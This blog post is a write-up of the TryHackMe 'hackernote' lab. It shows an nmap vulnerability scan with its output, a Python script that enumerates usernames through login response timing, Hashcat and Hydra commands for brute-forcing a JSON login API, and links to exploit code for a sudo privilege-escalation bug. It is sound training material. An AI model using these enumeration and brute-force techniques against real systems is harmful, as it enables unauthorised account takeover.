---
title: 'TryHackMe: Web Fundamentals (Supplements)'
date: 2022-01-31 12:00:00.000000000 Z
layout: post-external
original_link: https://cardboard-iguana.com/log/2022-01-31-tryhackme-web-fundamentals-supplements.html
author: 100007
---

# TryHackMe: Web Fundamentals (Supplements)

**author:** Nathan Acks  
**date:** 2022-01-31

# hackernote

## Reconnaissance

The target is 10.10.156.141. As usual, it looks like we’re starting off with an nmap scan.

```
sudo nmap -v -oA hackernote -Pn -A -T4 -sS \
--script vuln -p- 10.10.156.141
```

This gives the following output:

```
# Nmap 7.92 scan initiated Mon Jan 31 18:14:16 2022 as: nmap -v -oA hackernote -Pn -A -T4 -sS -script vuln -p- 10.10.156.141
Pre-scan script results:
|_broadcast-avahi-dos: ERROR: Script execution failed (use -d to debug)
Increasing send delay for 10.10.156.141 from 0 to 5 due to 11 out of 25 dropped probes since last increase.
Nmap scan report for 10.10.156.141
Host is up (0.17s latency).
Not shown: 65532 closed tcp ports (reset)
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| vulners:
| cpe:/a:openbsd:openssh:7.6p1:
| MSF:ILITIES/UBUNTU-CVE-2019-6111/ 5.8 https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2019-6111/ *EXPLOIT*
| MSF:ILITIES/SUSE-CVE-2019-6111/ 5.8 https://vulners.com/metasploit/MSF:ILITIES/SUSE-CVE-2019-6111/ *EXPLOIT*
| MSF:ILITIES/SUSE-CVE-2019-25017/ 5.8 https://vulners.com/metasploit/MSF:ILITIES/SUSE-CVE-2019-25017/ *EXPLOIT*
| MSF:ILITIES/REDHAT_LINUX-CVE-2019-6111/ 5.8 https://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2019-6111/ *EXPLOIT*
| MSF:ILITIES/REDHAT-OPENSHIFT-CVE-2019-6111/ 5.8 https://vulners.com/metasploit/MSF:ILITIES/REDHAT-OPENSHIFT-CVE-2019-6111/ *EXPLOIT*
| MSF:ILITIES/ORACLE-SOLARIS-CVE-2019-6111/ 5.8 https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2019-6111/ *EXPLOIT*
| MSF:ILITIES/OPENBSD-OPENSSH-CVE-2019-6111/ 5.8 https://vulners.com/metasploit/MSF:ILITIES/OPENBSD-OPENSSH-CVE-2019-6111/ *EXPLOIT*
| MSF:ILITIES/IBM-AIX-CVE-2019-6111/ 5.8 https://vulners.com/metasploit/MSF:ILITIES/IBM-AIX-CVE-2019-6111/ *EXPLOIT*
| MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2019-6111/ 5.8 https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2019-6111/ *EXPLOIT*
| MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2019-6111/ 5.8 https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2019-6111/ *EXPLOIT*
| MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2019-6111/ 5.8 https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2019-6111/ *EXPLOIT*
| MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2019-6111/ 5.8 https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2019-6111/ *EXPLOIT*
| MSF:ILITIES/GENTOO-LINUX-CVE-2019-6111/ 5.8 https://vulners.com/metasploit/MSF:ILITIES/GENTOO-LINUX-CVE-2019-6111/ *EXPLOIT*
| MSF:ILITIES/F5-BIG-IP-CVE-2019-6111/ 5.8 https://vulners.com/metasploit/MSF:ILITIES/F5-BIG-IP-CVE-2019-6111/ *EXPLOIT*
| MSF:ILITIES/DEBIAN-CVE-2019-6111/ 5.8 https://vulners.com/metasploit/MSF:ILITIES/DEBIAN-CVE-2019-6111/ *EXPLOIT*
| MSF:ILITIES/CENTOS_LINUX-CVE-2019-6111/ 5.8 https://vulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-2019-6111/ *EXPLOIT*
| MSF:ILITIES/AMAZON_LINUX-CVE-2019-6111/ 5.8 https://vulners.com/metasploit/MSF:ILITIES/AMAZON_LINUX-CVE-2019-6111/ *EXPLOIT*
| MSF:ILITIES/AMAZON-LINUX-AMI-2-CVE-2019-6111/ 5.8 https://vulners.com/metasploit/MSF:ILITIES/AMAZON-LINUX-AMI-2-CVE-2019-6111/ *EXPLOIT*
| MSF:ILITIES/ALPINE-LINUX-CVE-2019-6111/ 5.8 https://vulners.com/metasploit/MSF:ILITIES/ALPINE-LINUX-CVE-2019-6111/ *EXPLOIT*
| EXPLOITPACK:98FE96309F9524B8C84C508837551A19 5.8 https://vulners.com/exploitpack/EXPLOITPACK:98FE96309F9524B8C84C508837551A19 *EXPLOIT*
| EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97 5.8 https://vulners.com/exploitpack/EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97 *EXPLOIT*
| EDB-ID:46516 5.8 https://vulners.com/exploitdb/EDB-ID:46516 *EXPLOIT*
| EDB-ID:46193 5.8 https://vulners.com/exploitdb/EDB-ID:46193 *EXPLOIT*
| CVE-2019-6111 5.8 https://vulners.com/cve/CVE-2019-6111
| 1337DAY-ID-32328 5.8 https://vulners.com/zdt/1337DAY-ID-32328 *EXPLOIT*
| 1337DAY-ID-32009 5.8 https://vulners.com/zdt/1337DAY-ID-32009 *EXPLOIT*
| SSH_ENUM 5.0 https://vulners.com/canvas/SSH_ENUM *EXPLOIT*
| PACKETSTORM:150621 5.0 https://vulners.com/packetstorm/PACKETSTORM:150621 *EXPLOIT*
| MSF:AUXILIARY/SCANNER/SSH/SSH_ENUMUSERS 5.0 https://vulners.com/metasploit/MSF:AUXILIARY/SCANNER/SSH/SSH_ENUMUSERS *EXPLOIT*
| EXPLOITPACK:F957D7E8A0CC1E23C3C649B764E13FB0 5.0 https://vulners.com/exploitpack/EXPLOITPACK:F957D7E8A0CC1E23C3C649B764E13FB0 *EXPLOIT*
| EXPLOITPACK:EBDBC5685E3276D648B4D14B75563283 5.0 https://vulners.com/exploitpack/EXPLOITPACK:EBDBC5685E3276D648B4D14B75563283 *EXPLOIT*
| EDB-ID:45939 5.0 https://vulners.com/exploitdb/EDB-ID:45939 *EXPLOIT*
| EDB-ID:45233 5.0 https://vulners.com/exploitdb/EDB-ID:45233 *EXPLOIT*
| CVE-2018-15919 5.0 https://vulners.com/cve/CVE-2018-15919
| CVE-2018-15473 5.0 https://vulners.com/cve/CVE-2018-15473
| 1337DAY-ID-31730 5.0 https://vulners.com/zdt/1337DAY-ID-31730 *EXPLOIT*
| CVE-2021-41617 4.4 https://vulners.com/cve/CVE-2021-41617
| MSF:ILITIES/OPENBSD-OPENSSH-CVE-2020-14145/ 4.3 https://vulners.com/metasploit/MSF:ILITIES/OPENBSD-OPENSSH-CVE-2020-14145/ *EXPLOIT*
| MSF:ILITIES/HUAWEI-EULEROS-2_0_SP9-CVE-2020-14145/ 4.3 https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP9-CVE-2020-14145/ *EXPLOIT*
| MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2020-14145/ 4.3 https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2020-14145/ *EXPLOIT*
| MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2020-14145/ 4.3 https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2020-14145/ *EXPLOIT*
| MSF:ILITIES/F5-BIG-IP-CVE-2020-14145/ 4.3 https://vulners.com/metasploit/MSF:ILITIES/F5-BIG-IP-CVE-2020-14145/ *EXPLOIT*
| CVE-2020-14145 4.3 https://vulners.com/cve/CVE-2020-14145
| CVE-2019-6110 4.0 https://vulners.com/cve/CVE-2019-6110
| CVE-2019-6109 4.0 https://vulners.com/cve/CVE-2019-6109
| CVE-2018-20685 2.6 https://vulners.com/cve/CVE-2018-20685
| PACKETSTORM:151227 0.0 https://vulners.com/packetstorm/PACKETSTORM:151227 *EXPLOIT*
|_ 1337DAY-ID-30937 0.0 https://vulners.com/zdt/1337DAY-ID-30937 *EXPLOIT*
80/tcp open http Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
| http-slowloris-check:
| VULNERABLE:
| Slowloris DOS attack
| State: LIKELY VULNERABLE
| IDs: CVE:CVE-2007-6750
| Slowloris tries to keep many connections to the target web server open and hold
| them open as long as possible. It accomplishes this by opening connections to
| the target web server and sending a partial request. By doing so, it starves
| the http server's resources causing Denial Of Service.
|
| Disclosure date: 2009-09-17
| References:
| http://ha.ckers.org/slowloris/
|_ https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_http-passwd: ERROR: Script execution failed (use -d to debug)
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum:
| /login/: Login page
|_ /notes/: Potentially interesting folder
8080/tcp open http Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-enum:
| /login/: Login page
|_ /notes/: Potentially interesting folder
| http-slowloris-check:
| VULNERABLE:
| Slowloris DOS attack
| State: LIKELY VULNERABLE
| IDs: CVE:CVE-2007-6750
| Slowloris tries to keep many connections to the target web server open and hold
| them open as long as possible. It accomplishes this by opening connections to
| the target web server and sending a partial request. By doing so, it starves
| the http server's resources causing Denial Of Service.
|
| Disclosure date: 2009-09-17
| References:
| http://ha.ckers.org/slowloris/
|_ https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_http-passwd: ERROR: Script execution failed (use -d to debug)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=1/31%OT=22%CT=1%CU=34900%PV=Y%DS=4%DC=T%G=Y%TM=61F88F1
OS:B%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M506ST11NW7%O2=M506ST11NW7%O3=M506NNT11NW7%O4=M506ST11NW7%O5=M506ST1
OS:1NW7%O6=M506ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN
OS:(R=Y%DF=Y%T=40%W=F507%O=M506NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)
Uptime guess: 15.106 days (since Sun Jan 16 16:05:20 2022)
Network Distance: 4 hops
TCP Sequence Prediction: Difficulty=263 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
TRACEROUTE (using port 21/tcp)
HOP RTT ADDRESS
1 31.72 ms 10.13.0.1
2 ... 3
4 173.93 ms 10.10.156.141
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jan 31 18:38:35 2022 -- 1 IP address (1 host up) scanned in 1459.69 seconds
```

- [Using “nmap”](https://cardboard-iguana.com/notes/nmap.html)

## Exploit

The point of this exercise is to write a Python script to take advantage of the timing difference between trying to log in using a valid vs. invalid username.

```
#!/usr/bin/python3

import sys
import time
import requests
usernames = open(sys.argv[2], 'r')
for username in usernames.readlines():
creds = {
'username': username.strip(),
'password': 'invalidPassword!'
}
startTime = time.time()
response = requests.post('http://' + sys.argv[1] + '/api/user/login', json = creds)
endTime = time.time()
print(str(endTime - startTime) + " " + username.strip())
usernames.close()
```

- [Opening and Closing Files in Python](https://www.tutorialspoint.com/opening-and-closing-files-in-python)
- [Python - Command Line Arguments](https://www.tutorialspoint.com/python/python_command_line_arguments.htm)
- [Python File readlines() Method](https://www.tutorialspoint.com/python/file_readlines.htm)
- [Quickstart – Requests](https://docs.python-requests.org/en/latest/user/quickstart/)
- [Calculating Time Difference](https://stackoverflow.com/a/3426953)
- [Python string | strip()](https://www.geeksforgeeks.org/python-string-strip/)

My general strategy here is to not get too fancy in Python, but rather just to output the time it takes to log in given a particular username and then do the subsequent analysis using normal shell tools.

Saving the above script as `hackernote-user-enum.py` and using the `Names/names.txt` list (which is the shorter – as suggested – of the two lists mentioned by the exercise), we create an ordered lists where those usernames that took longest to respond with an error message are listed last:

```
chmod +x hackernote-user-enum.py
unbuffer ./hackernote-user-enum.py 10.10.156.141 \
names.txt | \
tee hackernote-user-enum.out
cat hackernote-user-enum.out | sort -n
```

The `unbuffer` command is used to force line-buffering of stdout in a pipeline.

Note that this takes a looong time. And we really need to run this process twice – once with the full list, and once with only those names that initially took longer than 1.7 seconds (this is necessary because the web server seems to periodically hang when rapidly hit by requests; 1.7 seconds is chosen based on the time it takes to run the script against a test list composed of my known-good user and a couple of other names).

The second run is, mercifully, much shorter, and makes it obvious that there is only a single valid user, `james`.

- [SecLists / Usernames / Names / names.txt](https://github.com/danielmiessler/SecLists/blob/master/Usernames/Names/names.txt)
- [Force line-buffering of stdout in a pipeline](https://stackoverflow.com/questions/11337041/force-line-buffering-of-stdout-in-a-pipeline#comment111940075_11337310)

## Attack Passwords

The Hashcat `combinator.bin` utility combines two wordlists such that every entry of the first list is concatenated with every entry from the second list.

```
/usr/lib/hashcat-utils/combinator.bin \
$WORDLIST1 $WORDLIST2 > $COMBINED_WORDLIST
```

Hydra can be used to attack API endpoints that accept JSON (though apparently there can be some problems with the headers that are passed along):

```
hydra -vV -f -l $USERNAME -P $PASSWORDLIST \
$HOST http-post-form \ 
$ENDPOINT:"$TEMPLATE":F="$INVALID":H="Content-Type\: application/json"
```

The `$TEMPLATE` is basically the JSON request body with the special placeholders `^USER^` and `^PASS^` (colons escaped). `$INVALID` is a string that will appear for login _failures_ (note that this string _cannot_ contain a colon, but fortunately is a substring match). The `H` parameter at the end allows us to override specific headers (necessary because otherwise Hydra sends a Content-Type of application/x-www-form-urlencoded).

Putting this all together, we have:

```
hydra -vV -f -l james -P passwords.txt \
10.10.156.141 http-post-form \
/api/user/login:"{\"username\"\:\"^USER^\",\"password\"\:\"^PASS^\"}":F="Invalid Username Or Password":H="Content-Type\: application/json"
```

- [Using Hashcat](https://cardboard-iguana.com/notes/hashcat.html)
- [Using Hydra](https://cardboard-iguana.com/notes/hydra.html)
- [Hydra bruteforce and JSON](https://security.stackexchange.com/questions/57839/hydra-bruteforce-and-json)
- [Bruteforce - Using Hydra with JSON](https://security.stackexchange.com/questions/203501/bruteforce-using-hydra-with-json)

## Escalate

[Details about the sudo “pwfeedback” bug (CVE-2019-18634).](https://www.sudo.ws/security/advisories/pwfeedback/)

[Exploit code for CVE-2019-18634.](https://github.com/saleemrashid/sudo-cve-2019-18634)

